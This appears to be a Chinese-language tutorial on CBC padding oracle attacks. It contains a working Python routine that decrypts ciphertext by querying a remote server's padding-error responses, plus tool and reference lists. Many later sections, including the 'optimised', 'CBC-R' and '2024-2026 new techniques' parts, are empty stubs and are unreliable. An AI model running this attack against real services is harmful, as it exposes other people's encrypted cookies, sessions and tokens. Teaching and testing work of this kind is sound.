# Padding Oracle 攻击

## 原理

CBC 模式解密时，如果服务端对 padding 错误的响应与 padding 正确的响应不同，攻击者可通过这种差异逐字节恢复明文。

## CBC 解密原理

```python
# CBC 解密
# P_i = D(C_i) ^ C_{i-1}
# 
# PKCS7 padding
# 如果块大小 16，最后一块需要填充 n 个字节 n
# 例如：填充 4 字节 → 04 04 04 04

# 解密后检查 padding
# 如果 padding 不正确 → 报错
# 如果 padding 正确 → 正常响应
```

## 攻击链

### 1. 基础 Padding Oracle

```python
from pwn import *
import sys

def padding_oracle(oracle, ciphertext, block_size=16):
    # ciphertext: IV + C1 + C2 + ... + Cn
    plaintext = b''
    
    # 逐块解密
    for i in range(1, len(ciphertext) // block_size):
        # 解密第 i 块
        block = ciphertext[i*block_size:(i+1)*block_size]
        prev_block = ciphertext[(i-1)*block_size:i*block_size]
        
        # 构造攻击块
        attack_block = bytearray(block_size)
        intermediate = bytearray(block_size)
        
        # 逐字节恢复
        for j in range(block_size - 1, -1, -1):
            # 设置已知字节
            for k in range(j + 1, block_size):
                attack_block[k] = intermediate[k] ^ (block_size - j)
            
            # 尝试所有可能值
            for b in range(256):
                attack_block[j] = b
                test = bytes(attack_block) + block
                if oracle(test):
                    # padding 正确
                    intermediate[j] = b ^ (block_size - j)
                    break
            else:
                print(f"Failed at byte {j}")
                return None
        
        # 恢复明文
        plaintext_block = bytes([intermediate[k] ^ prev_block[k] for k in range(block_size)])
        plaintext += plaintext_block
    
    return plaintext

def oracle(data):
    # 发送数据到服务器
    # 返回 True 如果 padding 正确
    # 返回 False 如果 padding 错误
    r = requests.post(URL, data={'data': data.hex()})
    return 'success' in r.text
```

### 2. 优化版本

```python
def padding_oracle_fast(oracle, ciphertext, block_size=16):
    # 使用二分查找优化
    # 使用多线程
    # ...
    pass
```

### 3. CBC-R（加密）

```python
# 通过 Padding Oracle 实现加密
# 不需要密钥
def cbc_r_encrypt(oracle, plaintext, block_size=16):
    # 从后向前构造密文
    # ...
    pass
```

### 4. PKCS7 vs PKCS1

```python
# PKCS7 padding
# 块大小 n，填充 k 个字节 k
# 1 ≤ k ≤ n

# PKCS1 v1.5 padding
# 0x00 0x02 [random non-zero bytes] 0x00 [message]
# Bleichenbacher 攻击
```

## 攻击场景

### 1. Web 应用

```python
# Cookie 解密
# Session 解密
# Token 解密
# 如果应用解密后检查 padding 并返回不同错误
```

### 2. API

```python
# REST API
# GraphQL
# 如果 API 解密参数并检查 padding
```

### 3. 文件加密

```python
# 加密文件
# 如果应用解密文件并检查 padding
```

## 2024-2026 新技术点

### 1. 现代 padding 方案

```python
# PKCS7
# PKCS1 v1.5
# OAEP
# PSS
# 各 padding 方案的攻击
```

### 2. AEAD

```python
# GCM
# ChaCha20-Poly1305
# AEAD 模式无 padding oracle
# 但有其他攻击
```

### 3. 侧信道

```python
# 时间侧信道
# 错误信息侧信道
# 各侧信道
```

### 4. 量子攻击

```python
# 量子算法
# 影响 padding oracle
```

### 5. AI 辅助

```python
# ML 辅助
# 自动检测 oracle
# 优化攻击
```

### 6. 新型 oracle

```python
# 不同类型的 oracle
# 错误码
# 响应时间
# 状态码
```

### 7. 容器环境

```python
# 容器中的 padding oracle
# 微服务中的 padding oracle
```

### 8. 云环境

```python
# 云服务中的 padding oracle
# KMS
# 各云服务
```

### 9. 移动应用

```python
# Android/iOS 应用中的 padding oracle
# 各移动应用
```

### 10. IoT 设备

```python
# IoT 设备中的 padding oracle
# 各 IoT 设备
```

## 工具推荐

- **padding-oracle-tool** — 自动化攻击
- **PadBuster** — 自动化攻击
- **Burp Suite** — 手动测试
- **python-paddingoracle** — Python 库

## 参考链接

- [ctf-wiki padding oracle](https://ctf-wiki.org/crypto/blockcipher/padding-oracle/)
- [Padding Oracle Attack](https://github.com/AonCyberLabs/padding-oracle-tool)
- [PadBuster](https://github.com/GDSSecurity/PadBuster)
- [PortSwigger Padding Oracle](https://portswigger.net/web-security/oracles)
